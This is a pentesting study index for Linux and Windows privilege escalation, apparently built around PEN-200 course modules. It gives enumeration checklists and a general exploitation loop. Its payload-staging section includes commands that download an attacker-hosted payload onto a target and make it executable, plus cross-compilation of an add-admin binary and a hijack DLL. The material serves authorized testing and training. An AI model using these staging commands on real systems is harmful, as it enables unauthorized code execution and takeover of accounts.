# Privilege Escalation

Privesc playbook for standalone boxes, split by OS. Notes here template with **BoxHelper.html**
(`{{TARGET_IP}}`, `{{LHOST}}`, `{{LPORT}}`, `{{USERNAME}}`, `{{PASSWORD}}`, `{{WORDLIST}}`, `{{OUTPUT}}`, …).

- [linux.md](linux.md) — PEN-200 Module 18 (Linux Privilege Escalation): manual + automated enumeration,
  leaked credentials (env vars, history, sniffed traffic), insecure file permissions (cron, `/etc/passwd`),
  SUID/capabilities, sudo (GTFOBins), kernel exploits.
- [windows.md](windows.md) — PEN-200 Module 17 (Windows Privilege Escalation): SID/token/UAC theory,
  situational awareness, leaked credentials (dotfiles, PowerShell history/transcripts), service abuse
  (binary hijack, DLL hijack, unquoted paths), scheduled tasks, kernel exploits, `SeImpersonatePrivilege`/Potato.

> **The one rule:** enumerate before you exploit, and re-enumerate after every pivot. Almost every
> vector in both files starts from something *found*, not guessed — a writable file, a leaked
> password, a misconfigured permission. The exploit step is usually the easy part once the finding
> is in hand.

---

## 1 · Same shape, different levers

Both OSes reduce to the same four questions; only the mechanism differs:

| Question | Linux | Windows |
|---|---|---|
| **Who am I, what can I reach?** | `id`, `sudo -l`, `find / -perm -u=s` | `whoami /groups`, `whoami /priv`, `Get-LocalGroupMember` |
| **What did someone leave behind?** | `.bash_history`, `env`, cron scripts, world-readable configs | PSReadLine history, PS Transcripts, `.txt`/`.kdbx`/`.ini` sweeps |
| **What runs privileged that I can touch?** | SUID/capability binaries, sudo-permitted commands, cron jobs | service binaries/DLLs/paths, scheduled tasks |
| **Is there a known bug in the OS itself?** | kernel exploit matched via `uname -a` + searchsploit | kernel CVE matched via `systeminfo` hotfix list; `SeImpersonatePrivilege` → Potato |

Automated sweep tools exist for both and should run **alongside**, not instead of, manual review —
`unix-privesc-check`/LinPEAS (`../linpeas/`) miss custom one-offs just like winPEAS
(`../winpeas/`) does; see linux.md §18.1.3 and windows.md §17.1.5 for concrete examples of each
tool's blind spots.

---

## 2 · The recurring pattern: find something writable that runs as someone else

Most of both files' techniques are one shape — **a privileged process executes a file path you can
write to** — applied to different Windows/Linux mechanisms:

| Mechanism | Linux | Windows |
|---|---|---|
| Scheduled execution | cron job script | Scheduled Task action |
| Service/daemon binary | (rare — most system daemons are packaged read-only) | service `PathName`, or an unquoted-path segment |
| Library load | (LD_PRELOAD-style hijacks, out of scope here) | missing DLL in the app's search-order directory |
| Auth data itself | writable `/etc/passwd` (2nd field hash wins over `/etc/shadow`) | — |

The exploitation loop is always: **find write access → confirm the privileged trigger will fire →
drop payload → wait or force the trigger → clean up / restore the original** (rename, don't
delete, whatever you overwrote).

---

## 3 · Staging payloads

Both files lean on a Kali-hosted Python web server + native pull command — keep this pair handy:

```bash
python3 -m http.server 80        # serve from the directory holding your payload
```

```bash
# Linux target
wget http://{{LHOST}}/payload -O /tmp/payload && chmod +x /tmp/payload
```

```powershell
# Windows target
iwr -uri http://{{LHOST}}/payload.exe -Outfile payload.exe
```

Cross-compiling a Windows payload from Kali (used repeatedly in windows.md for the
add-local-admin binary/DLL):

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe            # EXE
x86_64-w64-mingw32-gcc hijack.cpp --shared -o hijack.dll   # DLL
```

> Document as you go: which file/permission/credential you found, exactly what you overwrote or
> abused, and how you restored the box afterward. In a real engagement, leaving a service binary
> replaced or a reboot uncoordinated is its own finding.
